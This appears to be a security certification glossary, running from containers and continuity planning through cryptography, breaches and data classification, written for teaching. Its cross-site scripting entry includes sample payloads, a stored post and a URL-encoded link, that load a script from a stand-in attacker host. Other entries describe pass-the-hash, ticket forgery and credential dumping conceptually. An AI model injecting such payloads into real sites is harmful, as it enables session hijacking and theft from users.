For example, all components required to deliver a web application could be deployed in containers and managed using a container platform such as Docker (Docker represents the cargo ship used to hold the containers.) This differs significantly from installing the components from a code repository directly "into" the operating system and manually editing all associated configuration files. By leveraging containers, different application components can be "swapped," avoiding many complexities associated with traditional software installation and configuration. Traditional methods frequently encounter issues because the target system's configuration has different versions of software and libraries needed by the new components. A "dependency nightmare" often manifests as a frustrating cycle of attempting to resolve conflicts by updating or downgrading dependencies, only to encounter new issues or break existing functionality in the process. This wastes time and effort for developers navigating through a maze of dependencies. Containerized applications avoid this because they are self-contained units, each holding an independent copy of its dependencies.

Hypervisors play a critical role in virtualization by managing multiple virtual machines (VMs) on a single hardware platform. There are two main types of hypervisors: Type 1 and Type 2. Type 1 hypervisors, also known as bare-metal hypervisors, run directly on the physical hardware, offering high performance and efficiency, which makes them ideal for enterprise environments. Examples include VMware ESXi and Microsoft Hyper-V. Type 2 hypervisors, or hosted hypervisors, run on top of a host operating system and are often used for development and testing purposes. Examples of Type 2 hypervisors include VMware Workstation and Oracle VirtualBox.
Continuity of Operations (COOP) - Identifies how business processes should deal with both minor and disaster-level disruption by ensuring that there is processing redundancy supporting the workflow.

Continuity of operations (COOP) refers to the process of ensuring that an organization can maintain or quickly resume its critical functions in the event of a disruption, disaster, or crisis. COOP concepts and strategies aim to minimize downtime, protect essential resources, and maintain business resilience. Key elements of a COOP plan include identifying critical business functions, establishing priorities, and determining the resources needed to support these functions. Strategies often involve creating redundancy for IT systems and data, such as implementing off-site backups, failover systems, and disaster recovery solutions. Additionally, organizations may consider alternative work arrangements, such as remote work or co-location arrangements, to maintain operations during a crisis. Developing clear communication and decision-making protocols ensures that employees understand their roles and responsibilities during an emergency.

Regular testing and updating of continuity of operations plans (COOP) are crucial to ensure the organization can maintain essential functions during and after disruptive events. Realistic scenarios designed to simulate various disruptions, such as natural disasters, cyberattacks, or pandemics, must be used to assess the plan's effectiveness. Testing methods often include tabletop exercises, isolated functional tests, or full-scale drills. Each approach provides different levels of assurance and must therefore use pre-established evaluation criteria for measuring performance. In essence, COOP strategies focus on proactively preparing for disruptions, ensuring that organizations can continue to deliver essential services and minimize the impact of unforeseen events on their operations.

Backups
Backups play a critical role in the continuity of operations plans (COOP) by safeguarding against data loss and restoring systems and data in the event of disruptions. Regular testing verifies the integrity and effectiveness of backups. Testing backups helps ensure the backup process functions correctly by simulating various scenarios and allows organizations to identify any issues or gaps in the backup and recovery process. Testing backups validates the recoverability of critical systems and data, reducing the risk of data loss and minimizing downtime associated with disruptive events. Additionally, testing backups allows organizations to assess their recovery plans, evaluate the speed and efficiency of their backup systems, and ensure compliance with regulatory requirements. Inadequate backup processes can lead to extended downtime, critical data loss, financial losses, reputation damage, and noncompliance.

Relationship to Business Continuity
Continuity of operations (COOP) and business continuity (BC) are closely related concepts that both focus on maintaining the ongoing functioning of an organization during and after a disruption, disaster, or crisis. However, they differ slightly in terms of their scope and primary objectives.

Continuity of operations primarily addresses the continuity of critical functions and services within an organization during an emergency or disaster. It often involves the development and implementation of strategies to maintain or restore essential operations, such as redundant IT systems, off-site backups, and disaster recovery solutions. COOP usually encompasses a shorter time frame, focusing on the immediate response to a disruption and the steps taken to resume critical functions as quickly as possible.

Business continuity, on the other hand, takes a broader approach, considering not only the continuity of critical functions but also the overall resilience and recovery of the entire organization. Business continuity planning includes the assessment of risks, the development of strategies to mitigate those risks, and the creation of plans to maintain or restore business operations in the face of various threats. This may involve addressing supply chain management, employee safety and communication, legal and regulatory compliance, and reputation management. Business continuity aims to ensure the long-term viability of an organization following a disruption, encompassing both immediate response and ongoing recovery efforts.

Continuity of operations is a component of the broader business continuity concept. Both are focused on maintaining the ongoing functioning of an organization during disruptions, but COOP is primarily concerned with the immediate response and restoration of critical functions, while business continuity encompasses a more comprehensive approach to ensure the overall resilience and recovery of the entire organization.

Capacity Planning
Capacity planning (a practice which involves estimating the personnel, storage, computer hardware, software, and connection infrastructure resources required over some future period of time) is a critical process in which organizations assess their current and future resource requirements to ensure they can efficiently meet their business objectives. This process involves evaluating and forecasting the necessary resources in terms of people, technology, and infrastructure to support anticipated growth, changes in demand, or other factors that may impact operations. For people, capacity planning considers the number of employees, their skill sets, and the potential need for additional training or hiring to meet future demands. This may involve evaluating workforce productivity, analyzing staffing levels, and identifying potential skills gaps. In terms of technology, capacity planning encompasses the assessment of hardware, software, and network resources required to support business operations, taking into account factors such as performance, scalability, and reliability.

Organizations must ensure they have the right technology resources in place to handle increasing workloads and support new applications or services. When it comes to infrastructure, capacity planning involves evaluating physical facilities, such as datacenters and office spaces, to determine whether they can accommodate projected growth and maintain business continuity. This may include considerations for power, cooling, and connectivity, as well as planning for potential expansion or relocation. Organizations use various capacity planning methods, including trend analysis, simulation modeling, and benchmarking, to help forecast their needs. Trend analysis examines historical data to identify patterns and trends in resource usage, demand, and performance. Organizations can forecast future resource requirements by understanding past patterns. This type of analysis can help identify potential bottlenecks or other areas that require attention. Simulation modeling leverages computer-based models to simulate real-world scenarios. Organizations can assess the impact of changes in demand, different resource allocation strategies, or system configurations to make informed decisions and optimize resource allocation to meet anticipated needs. Benchmarking requires a comparison of an organization's performance metrics against industry standards or best practices. Benchmarking provides a comparatively simple way to identify areas for improvement and establish performance targets. Ultimately, effective capacity planning allows organizations to optimize resource allocation, reduce costs, and minimize the risk of downtime or performance issues, ensuring they can continue to meet their business goals and maintain a competitive edge.
Continuous Penetration Testing - Focuses on technical vulnerabilities and often configured to leverage automation, especially for CI/CD environments.
Cookies - A text file used to store information about a user when they visit a website. Some sites use cookies to support user sessions.

Cookies are small pieces of data stored on a computer by a web browser while accessing a website. They maintain session states, remember user preferences, and track user behavior and other settings. Cookies can be exploited if not properly secured, leading to attacks such as session hijacking or cross-site scripting.

To implement secure cookies, developers must follow certain well-documented principles, such as using the 'Secure' attribute for all cookies to ensure they are only sent over HTTPS connections and protected from interception via eavesdropping, using the 'HttpOnly' attribute to prevent client-side scripts from accessing cookies and protect against cross-site scripting attacks, and using the 'SameSite' attribute to limit when cookies are sent to mitigate cross-site request forgery attacks. Additionally, cookies should have expiration time limits to restrict their usable life.

Secure cookie techniques are critical in mitigating several web-based application attacks, particularly those focused on unauthorized access or manipulation of session cookies. Developers can defend against attacks that target them by employing specific attributes within cookies.
Corporate Owned, Business Only (COBO) - Enterprise mobile device provisioning model where the device is the property of the organization and personal use is prohibited.
Corporate Owned, Personally Enabled (COPE) - Enterprise mobile device provisioning model where the device remains the property of the organization, but certain personal use, such as private email, social networking, and web browsing, is permitted.
Corrective Security Control - A type of security control that acts after an incident to eliminate or minimize its impact. The control eliminates or reduces the impact of a security policy violation. A corrective control is used after an attack. A good example is a backup system that restores data that was damaged during an intrusion. Another example is a patch management system that eliminates the vulnerability exploited during the attack.
Correlation - A function of log analysis that links log and state data to identify a pattern that should be logged or alerted as an event.
Covert Channel - A type of attack that subverts network security systems and policies to transfer data without authorization or detection.
Credential Dumping - The malware might try to access the credentials file (SAM on a local Windows workstation) or sniff credentials held in memory by the lsass.exe system process. Additionally, a DCSync attack attempts to trick a domain controller into replicating its user list along with their credentials with a rogue host.
Credential Harvesting - Social engineering techniques for gathering valid credentials to use to gain unauthorized access.

Credential harvesting is a type of reconnaissance where the threat actor attempts to learn passwords or cryptographic secrets that will allow them to obtain authenticated access to network systems.
Credential Replay Attack - An attack that uses a captured authentication token to start an unauthorized session without having to discover the plaintext password for an account.

A threat actor might establish a foothold on the network by compromising a single workstation via malware or a password attack. Once an initial foothold has been gained, the threat actor's objective is likely to be to identify data assets. For this, they need to find ways to perform lateral movement to compromise other hosts on the network, and privilege escalation to gain more permissions over network assets. To accomplish these objectives, as well as cracking more passwords or finding more vulnerabilities, they can use credential replay attacks.

In terms of network attacks, credential replay attacks mostly target Windows Active Directory networks. There are also credential replay attacks that target web applications. We will discuss these in the next topic.

If a user account on a Windows host has authenticated to an Active Directory domain network, the Local Security Authority Subsystem Service (LSASS) caches various secrets in memory and in the Security Account Manager (SAM) registry database to facilitate single sign-on. These secrets include the following:

1. Kerberos Ticket Granting Ticket (TGT) and session key. This allows the host to request service tickets to access applications.

2. Service tickets for applications where the user has started a session.

3. NT hash of local and domain user and service accounts that are currently signed in, whether interactively or remotely over the network. Early Windows business networks used NT LAN Manager (NTLM) challenge and response authentication. While the NTLM protocol is deprecated for most uses, the NT hash is still used as the credential storage format. The NT hash is used where legacy NTLM authentication is still allowed, and can be involved in signing Kerberos requests and responses.

Critical for network security, if different users are signed in on the same host, secrets for all these accounts could be cached by LSASS. If some of these accounts are for more privileged users, such as domain administrators, a threat actor might be able to use the secrets to escalate privileges.

LSASS purges hashes from memory within a few minutes of the user signing out. The SAM database caches local and Microsoft account credentials, but not domain credentials. Some editions of Windows implement a virtualization feature called Credential Guard to protect these secrets from malicious processes, even if they have SYSTEM permissions.

Credential replay attacks use various mechanisms to obtain and exploit these locally stored secrets to start authenticated sessions on other hosts and applications on the network. For example, if a threat actor can obtain an NT hash, they can use a pass the hash (PtH) attack to start a session on another host if that host is running a service such as file sharing or remote desktop that still allows NTLM authentication.

Legacy NTLM authentication is often disabled as it is such a high security risk. Other types of credential replay are directed against Kerberos authentication and authorization. For example, a golden ticket attack attempts to forge a ticket granting ticket. If successful, this gives the threat actor effectively unrestricted access to all domain resources. A silver ticket attack attempts to forge service tickets. These can be described as pass the ticket (PtT) attacks.

Microsoft has released a number of mitigations against these specific credential replay attacks. Ensuring hosts are fully patched and use secure configuration baselines greatly reduces their effectiveness. Where they remain a risk, a detection system can be configured to correlate a sequence of security log events, but this method can be prone to false positives. Antivirus and host-based intrusion detection can often detect the malware code used to dump credentials or launch ticket forgery attacks.
Credentialed Scan - A scan that uses credentials, such as usernames and passwords, to take a deep dive during the vulnerability scan, which will produce more information while auditing the network.

A credentialed scan is giving a user account with login rights to various hosts, plus whatever other permissions are appropriate for the testing routines. This sort of test allows much more in-depth analysis, especially in detecting when applications or security settings may be misconfigured. It shows what an insider attack, or an attack with a compromised user account, may be able to achieve. A credentialed scan is a more intrusive type of scan than non-credentialed scanning.
Critical Elements for Security Awareness Training - 1. Policy/Handbooks - Policy and handbook training focus on familiarizing users with the organization's policies, procedures, and guidelines regarding data security, acceptable use of technology resources, data handling, and confidentiality and emphasize the importance of adhering to these policies to maintain a secure work environment.

2. Situational Awareness - Situational awareness training enhances users' ability to recognize and respond to potential security threats or suspicious activities. It emphasizes the importance of being vigilant, observing surroundings, and promptly reporting any unusual or problematic incidents that may pose a security risk.

3. Insider Threat - Insider threat training focuses on educating users about the potential risks and signs of insider threats within an organization. It helps individuals recognize and report suspicious behavior, understand the impact of insider threats on data security, and promote a culture of trust and accountability in handling sensitive information.

4. Password Management - Password management training guides users on creating strong, unique passwords; avoiding password reuse; and implementing best practices for securing and safeguarding passwords. It emphasizes the importance of regularly updating passwords and using multifactor authentication where available.

5. Removable Media and Cables - Removable media and cable training educate users on the risks associated with the unauthorized use, loss, or theft of removable media (such as USB mass storage devices) and the potential for unauthorized access or data breaches. It also guides users on the risks associated with malicious charging cables designed as an attack vector for gaining unauthorized device access.

6. Social Engineering - Social engineering training raises awareness about common social engineering tactics employed by attackers, such as phishing, pretexting, or baiting. It helps individuals recognize and avoid falling victim to these manipulative techniques, encouraging skepticism and critical thinking when interacting with unknown or suspicious requests.

7. Operational Security - Operational security training focuses on promoting good security practices in day-to-day operations. It covers physical security, workstation security, data classification, secure communications, and incident reporting to help users understand their role in preventing security incidents.

8. Hybrid/Remote Work Environments - Hybrid/remote work training addresses the unique security challenges associated with working from home or outside the traditional office environment. It covers topics such as secure remote access, secure Wi-Fi usage, protecting physical workspaces, and maintaining data security while working remotely.
Cross-Site Request Forgery (CSRF) - A malicious script hosted on the attacker's site that can exploit a session started on another site in the same browser.

A cross-site request forgery (CSRF) can exploit applications that use cookies to authenticate users and track sessions. To work, the threat actor must convince the victim to start a session with the target site. The attacker must then pass an HTTP request to the victim's browser that spoofs an action on the target site, such as changing a password or an email address. This request could be disguised in ways that accomplish the attack without the victim necessarily having to click a link. If the target site assumes that the browser is authenticated because there is a valid session cookie, and doesn't complete any additional authorization process on the attacker's input, it will accept the request as genuine. This is also referred to as a confused deputy attack.
Cross-Site Scripting (XSS) - A malicious script hosted on the attacker's site or coded in a link injected onto a trusted site designed to compromise clients browsing the trusted site, circumventing the browser's security model of trusted zones.

Web applications depend on scripting, and most websites these days are web applications rather than static webpages. If the user attempts to disable scripting, very few sites will be left available. A cross-site scripting (XSS) attack exploits the fact that the browser is likely to trust scripts that appear to come from a site the user has chosen to visit. XSS inserts a malicious script that appears to be part of the trusted site. A nonpersistent type of XSS attack would proceed as follows:

1. The attacker identifies an input validation vulnerability in the trusted site.

2. The attacker crafts a URL to perform a code injection against the trusted site. This could be coded in a link from the attacker's site to the trusted site or a link in an email message.

3. When the user clicks the link, the trusted site returns a page containing the malicious code injected by the attacker. As the browser is likely to be configured to allow the site to run scripts, the malicious code will execute.
The malicious code could be used to deface the trusted site (by adding any sort of arbitrary HTML code), steal data from the user's cookies, try to intercept information entered into a form, perform a request forgery attack, or try to install malware. The crucial point is that the malicious code runs in the client's browser with the same permission level as the trusted site.

An attack where the malicious input comes from a crafted link is a reflected or nonpersistent XSS attack. A stored/persistent XSS attack aims to insert code into a back-end database or content management system used by the trusted site. For example, the attacker may submit a post to a bulletin board with a malicious script embedded in the message. When other users view the message, the malicious script is executed. For example, with no input sanitization, a threat actor could type the following into a new post text field:

Check out this amazing <a href="https://trusted.foo">website</a><script src="https://badsite.foo/hook.js"></script>.

Users viewing the post will have the malicious script hook.js execute in their browser.

A third type of XSS attack exploits vulnerabilities in client-side scripts. Such scripts often use the Document Object Model (DOM - When attackers send malicious scripts to a web app's client-side implementation of JavaScript to execute their attack solely on the client) to modify the content and layout of a web page. For example, the "document.write" method enables a page to take some user input and modify the page accordingly. An exploit against a client-side script could work as follows:

The attacker identifies an input validation vulnerability in the trusted site. For example, a message board might take the user's name from an input text box and show it in a header.
https://trusted.foo/messages?user=james

The attacker crafts a URL to modify the parameters of a script that the server will return, such as the following :
https://trusted.foo/messages?user=James%3Cscript%20src%3D%22https%3A%2F%2Fbadsite.foo%2Fhook.js%22%3E%3C%2Fscript%3E

The server returns a page with the legitimate DOM script embedded, but containing the parameter:
James<script src="https://badsite.foo/hook.js"></script>

The browser renders the page using the DOM script, adding the text "James" to the header, but also executing the hook.js script at the same time.
DOM-based cross-site scripting (XSS) occurs when a web application's client-side script manipulates the Document Object Model (DOM) of a webpage. Unlike other forms of XSS attacks that exploit server-side vulnerabilities, DOM-based XSS attacks target the client-side environment, allowing an attacker to inject malicious script code executed within the user's browser within the context of the targeted webpage.
Crossover Error Rate (CER) - A biometric evaluation factor expressing the point at which FAR and FRR meet, with a low value indicating better performance. The point at which FRR and FAR meet. The lower the CER, the more efficient and reliable the technology.

Errors are reduced over time by tuning the system. This is typically accomplished by adjusting the sensitivity of the system until CER is reached.
Cryptanalysis - The science, art, and practice of breaking codes and ciphers. It is the art of cracking cryptographic systems.
Crypto-mining - Malware that hijacks computer resources to create cryptocurrency.
Crypto-Ransomware - The crypto class of ransomware attempts to encrypt data files on any fixed, removable, and network drives. If the attack is successful, the user will be unable to access the files without obtaining the private encryption key, which is held by the attacker. If successful, this sort of attack is extremely difficult to mitigate, unless the user has backups of the encrypted files. One example of crypto-ransomware is CryptoLocker, a Trojan that searches for files to encrypt and then prompts the victim to pay a sum of money before a certain countdown time, after which the malware destroys the key that allows the decryption.
Cryptographic Algorithm - Operations that transform a plaintext into a ciphertext with cryptographic properties, also called a cipher. There are symmetric, asymmetric, and hash cipher types. It is the process used to encrypt and decrypt a message.
Cryptographic Attacks - Attacks that target authentication systems often depend on the system using weak cryptography.

Downgrade Attacks
A cryptographic attack where the attacker exploits the need for backward compatibility to force a computer system to abandon the use of encrypted messages in favor of plaintext messages.

A downgrade attack makes a server or client use a lower specification protocol with weaker ciphers and key lengths. For example, a combination of an on-path and downgrade attack on HTTPS might try to force the client to use a weak version of transport layer security (TLS) or even downgrade to the legacy secure sockets layer (SSL) protocol. This makes it easier for a threat actor to force the use of weak cipher suites and forge the signature of a certificate authority that the client trusts.

A type of downgrade attack is used to attack Active Directory. A Kerberoasting attack attempts to discover the passwords that protect service accounts by obtaining service tickets and subjecting them to brute force password cracking attacks. If the credential portion of the service ticket is encrypted using AES, it is very hard to brute force. If the attack is able to cause the server to return the ticket using weak RC4 encryption, a cracker is more likely to be able to extract the service password.

Evidence of downgrade attacks is likely to be found in server logs or by intrusion detection systems.

Collision Attacks
In cryptography, the act of two different plaintext inputs producing the same exact ciphertext output.

A collision is where a weak cryptographic hashing function or implementation allows the generation of the same digest value for two different plaintexts. A collision attack exploits this vulnerability to forge a digital signature. The attack works as follows:

1. The attacker creates a malicious document and a benign document that produce the same hash value. The attacker submits the benign document for signing by the target.

2. The attacker then removes the signature from the benign document and adds it to the malicious document, forging the target's signature.

A collision attack could be used to forge a digital certificate to spoof a trusted website or to make it appear as though Trojan malware derived from a trusted publisher.

Birthday Attacks
A type of password attack that exploits weaknesses in the mathematical algorithms used to encrypt passwords, in order to take advantage of the probability of different password inputs producing the same encrypted output.

A collision attack depends on being able to create a malicious document that outputs the same hash as the benign document. Some collision attacks depend on being able to manipulate the way the hash is generated. A birthday attack is a means of exploiting collisions in hash functions through brute force. Brute force means attempting every possible combination until a successful one is achieved. The attack is named after the birthday paradox. This paradox shows that the computational time required to brute force a collision might be less than expected.

The birthday paradox asks how large must a group of people be so that the chance of two of them sharing a birthday is 50%. The answer is 23, but people who are not aware of the paradox often answer around 180 (365/2). The point is that the chances of someone sharing a particular birthday are small, but the chances of any two people in a group sharing any birth date in a calendar year get better and better as you add more people: 1 – (365 * (365 − 1) * (365 – 2) ... * (365 – ( N − 1)/365 N ) .

To exploit the paradox, the attacker creates multiple malicious and benign documents, both featuring minor changes (punctuation, extra spaces, and so on). Depending on the length of the hash and the limits to the non-suspicious changes that can be introduced, if the attacker can generate sufficient variations, then the chance of matching hash outputs can be better than 50%. This effectively means that a hash function that outputs 128-bit hashes can be attacked by a mechanism that can generate 2 64 variations. Computing 2 64 variations will take much less time than computing 2 128 variations.

Attacks that exploit collisions are difficult to launch, but the principle behind the attack informs the need to use authentication methods that use both strong ciphers and strong protocol and software implementations.
Cryptographic Key - In cryptography, a specific piece of information that is used in conjunction with an algorithm to perform encryption and decryption.
Cryptographic Primitive - A single hash function, symmetric cipher, or asymmetric cipher.
Cryptographic Vulnerabilities - Cryptographic vulnerabilities refer to weaknesses in cryptographic systems, protocols, or algorithms that can be exploited to compromise data. The significance of such vulnerabilities is profound, as cryptography forms the backbone of secure communication and data protection in modern digital systems. Moreover, weaknesses in cryptographic algorithms themselves can also pose a threat. For instance, MD5 and SHA-1, once widely used cryptographic hash functions, are now considered insecure due to vulnerabilities that allow for collision attacks, where two different inputs produce the same hash output, which is particularly troubling in scenarios where hashes are used to protect passwords.

Practical examples of cryptographic vulnerabilities include the Heartbleed vulnerability, which exploited a flaw in the OpenSSL cryptographic library, allowing attackers to read otherwise secure communication. Another example is the KRACK (Key Reinstallation Attacks) vulnerability in the WPA2 protocol that protects Wi-Fi traffic. This vulnerability allows an attacker within range of a victim to intercept and decrypt some types of sensitive network traffic.

Symmetric and asymmetric encryption algorithms and cipher suites can also have vulnerabilities that lead to potential security issues. One of the most significant vulnerabilities in symmetric encryption algorithms is the use of weak keys. The Data Encryption Standard (DES) algorithm, once a popular symmetric encryption standard, was found to be vulnerable to brute force attacks due to its 56-bit key size. The DES, developed in the early 1970s, was first publicly demonstrated to be vulnerable to brute force attacks in the late 1990s. This led to its replacement by more secure standards such as Triple DES and eventually the Advanced Encryption Standard (AES). Triple DES (3DES), which applies the DES algorithm three times to protect data, was considered significantly more secure than DES when it was initially introduced.

However, with the continued advancement of computational power and the discovery of additional attack methods, 3DES vulnerabilities have been found, most notably the "Sweet32" birthday attack (CVE-2016-2183) published in August 2016. The US National Institute of Standards and Technology (NIST) officially deprecated 3DES in 2017 and recommended its discontinuation by 2023.

Some asymmetric encryption algorithms also have vulnerabilities. For instance, RSA, a widely used public key cryptosystem, can be vulnerable if small key sizes are used or if the random number generation for creating the keys is weak. Also, if the same key pair is used for an extended period in an asymmetric scheme, the likelihood of the key being compromised increases.

Cipher suites, which describe combinations of encryption algorithms used in protocols like SSL/TLS, can also have vulnerabilities. SSL/TLS is commonly used to secure web browser sessions, encrypting communication between a browser and a web server and essentially turning an "http" web address into a secure "https" address. SSL/TLS is also used for secure email transmission (SMTP, POP, IMAP protocols), secure voice over IP (VOIP) calls, and file transfer protocols secure (FTPS). In all these cases, SSL/TLS helps protect sensitive data from being intercepted and read by unauthorized parties. Other networked applications and services also use SSL/TLS, including VPN connections, chat applications, and mobile apps that transmit sensitive data.

Prominent examples of attacks against cipher suite vulnerabilities include the BEAST (Browser Exploit Against SSL/TLS) and POODLE (Padding Oracle On Downgraded Legacy Encryption) attacks that target weaknesses in the cipher suites used by SSL and early versions of TLS. Both attacks exploited similar implementation flaws.

Protecting Cryptographic Keys
Generating and protecting cryptographic keys is crucial for ensuring the security and integrity of sensitive information. The most robust cryptographic system is rendered useless if the keys used to protect it are weak or poorly guarded.

Kerckhoffs's principle establishes that a cryptosystem should be secure, even if everything about the system except the key, is public knowledge.

Cryptographic key generation describes the process of creating cryptographic keys for encryption, decryption, authentication, or other uses. It is important to use industry best practice approaches when generating cryptographic keys to ensure they cannot be guessed or brute-forced. Cryptographic key protection requires implementing specialized security measures to safeguard keys from unauthorized access or disclosure, as cryptographic keys are typically nothing more than strings of alphanumeric characters stored in simple text files.

Common secure key storage practices are secure key storage systems, such as hardware security modules (HSMs) or key management systems (KMS), implementing proper access controls and authentication mechanisms, and regularly monitoring and auditing key usage. Additionally, organizations must periodically change cryptographic keys (also referred to as key rotation) to strengthen the system and combat risks associated with key breaches and brute force attacks.
Cryptography - The science and practice of altering data to make it unintelligible to unauthorized parties. Cryptography, which literally means "secret writing," is the art of making information secure by encoding it. This is the opposite of security through obscurity. Security through obscurity means keeping something a secret by hiding it. This is considered impossible (or at least high risk) on a computer system. With cryptography, it does not matter if third parties know of the existence and location of the secret, because they can never understand what it is without the means to decode it.
Cryptojacking Malware - Another type of crypto-malware hijacks the resources of the host to perform cryptocurrency mining. This is referred to as crypto-mining (Malware that hijacks computer resources to create cryptocurrency), and malware that performs crypto-mining maliciously is classed as cryptojacking. The total number of coins within a cryptocurrency is limited by the difficulty of performing the calculations necessary to mint a new digital coin. Consequently, new coins can be very valuable, but it takes enormous computing resources to discover them. Cryptojacking is often performed across botnets.
Cyber Threat Intelligence (CTI) - The process of investigating, collecting, analyzing, and disseminating information about emerging threats and threat sources.
Cybersecurity Frameworks (CSF) - Standards, best practices, and guidelines for effective security risk management. Some frameworks are general in nature, while others are specific to industry or technology types.
Cybersecurity Incident - An event that interrupts standard operations or compromises security policy.

A cybersecurity incident refers to either a successful or attempted violation of the security properties of an asset, compromising its confidentiality, integrity, or availability. Incident response (IR) policy sets the resources, processes, and guidelines for dealing with cybersecurity incidents.
Dark Net - It is a network established as an overlay to Internet infrastructure by software, such as The Onion Router (TOR), Freenet, or I2P, that acts to anonymize usage and prevent a third party from knowing about the existence of the network or analyzing any activity taking place over the network. Onion routing, for instance, uses multiple layers of encryption and relays between nodes to achieve this anonymity.
Dark Web - Resources on the Internet that are distributed between anonymized nodes and protected from general access by multiple layers of encryption and routing.

It is sites, content, and services accessible only over a dark net. While there are dark web search engines, many sites are hidden from them. Access to a dark web site via its URL is often only available via "word of mouth" bulletin boards.
Data / Privacy Breach - When confidential or private data is read, copied, or changed without authorization. Data breach events may have notification and reporting requirements.

A data breach occurs when information is read, modified, or deleted without authorization. "Read" in this sense can mean either seen by a person or transferred to a network or storage media. A data breach is the loss of any type of data (but notably corporate information and intellectual property), while a privacy breach refers specifically to loss or disclosure of personal and sensitive data.

Organizational Consequences
A data or privacy breach can have severe organizational consequences:

1. Reputation damage - Data breaches cause widespread negative publicity, and customers are less likely to trust a company that cannot secure its information assets.

2. Identity theft - If the breached data is exploited to perform identity theft, the data subject may be able to sue for damages.

3. Fines - Legislation might empower a regulator to levy fines. These can be a fixed sum or in the most serious cases a percentage of turnover.

4. Intellectual property (IP) theft - Loss of company data can lead to loss of revenue. This typically occurs when copyright material—unreleased movies and music tracks—is breached. The loss of patents, designs, trade secrets, and so on to competitors or state actors can also cause commercial losses, especially in overseas markets where IP theft may be difficult to remedy through legal action.

Notifications of Breaches
The requirements for different types of breaches are set out in law and/or in regulations. The requirements indicate who must be notified. A data breach can mean the loss or theft of information, the accidental disclosure of information, or the loss or damage of information. Note that there are substantial risks from accidental breaches if effective procedures are not in place. If a database administrator can run a query that shows unredacted credit card numbers, that is a data breach, regardless of whether the query ever leaves the database server.

Depending on the regulations, a breach may be considered to have occurred if there is just the potential for unauthorized access. For example, if a personal data file is configured with permissions that mistakenly allow any authenticated user to read it, this could be classed as a notifiable data breach, even if audit logs show that no actual improper access attempts were made.

Escalation
A breach may be detected by technical staff and if the event is considered minor, there may be a temptation to remediate the system and take no further notification action. This could place the company in legal jeopardy. Any breach of personal data and most breaches of IP should be escalated (In the context of support procedures, incident response, and breach-reporting, escalation is the process of involving expert and senior staff to assist in problem management) to senior decision-makers and any impacts from legislation and regulation properly considered.

Public Notification and Disclosure
Other than the regulator, notification might need to be made to law enforcement, individuals and third-party companies affected by the breach, and to the public through press or social media channels. For example, the Health Insurance Portability and Accountability Act (HIPAA - US federal law that protects the storage, reading, modification, and transmission of personal healthcare data) sets out reporting requirements in legislation, requiring breach notification to the affected individuals, the Secretary of the US Department of Health and Human Services, and, if more than 500 individuals are affected, to the media. The requirements also set out timescales for when these parties should be notified. For example, under GDPR, notification must be made within 72 hours of becoming aware of a breach of personal data. Regulations will also set out disclosing requirements, or the information that must be provided to each of the affected parties. Disclosure is likely to include a description of what information was breached, details for the main point of contact, likely consequences arising from the breach, and measures taken to mitigate the breach.

GDPR offers stronger protections than most federal and state laws in the United States, which tend to focus on industry-specific regulations, narrower definitions of personal data, and fewer rights and protections for data subjects. The passage of the California Consumer Privacy Act (CCPA) has changed the picture for domestic US legislation.
Data at Rest - Information that is primarily stored on specific media, rather than moving from one medium to another. It is the state when the data is in some sort of persistent storage media.	

This state means that the data is in some sort of persistent storage media. Examples of types of data that may be at rest include financial information stored in databases, archived audiovisual media, operational policies and other management documents, system configuration data, and more. In this state, it is usually possible to encrypt the data, using techniques such as whole disk encryption, database encryption, and file- or folder-level encryption. It is also possible to apply permissions—access control lists (ACLs)—to ensure only authorized users can read or modify the data. ACLs can be applied only if access to the data is fully mediated through a trusted OS.

With data at rest, there is a greater encryption challenge than with data in transit as the encryption keys must be kept secure for longer. Transport encryption can use ephemeral (session) keys.
Data Backup - A security copy of production data made to removable media, typically according to a regular schedule. Different backup types (full, incremental, or differential) balance media capacity, time required to backup, and time required to restore.

Backups play an essential role in asset protection by ensuring the availability and integrity of an organization's critical data and systems. By creating copies of important information and storing them securely in separate locations, backups are a safety net in case of hardware failure, data corruption, or cyberattacks such as ransomware. Regularly testing and verifying backup data is crucial to ensuring the reliability of the recovery process.

In an enterprise setting, simple backup techniques often prove insufficient to address large organizations' unique challenges and requirements. Scalability becomes a critical concern when vast amounts of data need to be managed efficiently. Simple backup methods may struggle to accommodate growth in data size and complexity.

Performance issues caused by simple backup techniques can disrupt business operations because they slow down applications while running and typically have lengthy recovery times. Additionally, enterprises demand greater granularity and customization to target specific applications, databases, or data subsets, which simple techniques often fail to provide.

Compliance and security requirements necessitate advanced features such as data encryption, access control, and audit trails that simplistic approaches typically lack. Moreover, robust disaster recovery plans and centralized management are essential components of an enterprise backup strategy. Simple backup techniques might not support advanced features like off-site replication, automated failover, or streamlined management of the diverse systems and geographic locations that comprise a modern organization's information technology environment.

Critical capabilities for enterprise backup solutions typically include the following features:

1. Support for various environments (virtual, physical, and cloud)

2. Data deduplication and compression to optimize storage space

3. Instant recovery and replication for quick failover

4. Ransomware protection and encryption for data security

5. Granular restore options for individual files, folders, or applications

6. Reporting, monitoring, and alerting tools for effective management

7. Integration with popular virtualization platforms, cloud providers, and storage systems
Data Classification - The process of applying confidentiality and privacy labels to information.
Data Classifications - The process of applying confidentiality and privacy labels to information.

Data classification and typing schemas tag data assets so that they can be managed through the information lifecycle. A data classification schema is a decision tree for applying one or more tags or labels to each data asset. Many data classification schemas are based on the degree of confidentiality required:

1. Public (unclassified) Data - There are no restrictions on viewing the data. Public information presents no risk to an organization if it is disclosed but does present a risk if it is modified or not available. In some government contexts, the use of ‘unclassified’ may require authorization before release.

2. Confidential Data - The information is sensitive but can be declassified, suitable for viewing only by personnel within the organization and possibly by trusted third parties under conditions such as NDAs. This classification does not necessarily include information requiring protection at the national security level.

3. Secret Data - This level of classification refers to information that, if disclosed, could cause serious damage to national security. Viewing is restricted to individuals with a need to know.

4. Top Secret Data - This is the highest level of classification for information whose unauthorized disclosure could cause exceptionally grave damage to national security. Viewing is extremely restricted and monitored.

5. Proprietary Data - Information created by an organization, typically about the products or services that it makes or provides. Proprietary information or intellectual property (IP) is information created and owned by the company, typically about the products or services that they make or perform. IP is an obvious target for a company's competitors, and IP in some industries (such as defense or energy) is of interest to foreign governments. IP may also represent a counterfeiting opportunity (movies, music, and books, for instance).

6. Private / Personal Data - This information relates to an individual identity. Private data examples include personally identifiable information (PII) such as names, addresses, social security numbers, financial information, and sensitive data like health records, login credentials, biometric data, and confidential business information.

7. Sensitive Data - This label is usually used in the context of personal data privacy-sensitive information about a subject that could harm them if made public and could prejudice decisions made about them if referred to by internal procedures. As defined by the EU's General Data Protection Regulation (GDPR), sensitive personal data includes religious beliefs, political opinions, trade union membership, gender, sexual orientation, racial or ethnic origin, genetic data, and health information.

